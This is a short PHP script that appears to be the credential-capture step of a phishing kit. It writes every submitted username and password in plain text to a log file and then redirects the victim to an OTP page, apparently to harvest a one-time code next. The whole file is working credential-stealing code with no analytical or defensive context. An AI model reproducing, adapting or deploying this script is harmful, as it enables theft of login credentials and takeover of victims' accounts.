<?php
file_put_contents("log.txt", "[Login] Username: " . $_POST['username'] . " | Password: " . $_POST['password'] . "\n", FILE_APPEND);
header("Location: otp.php");
exit();
?>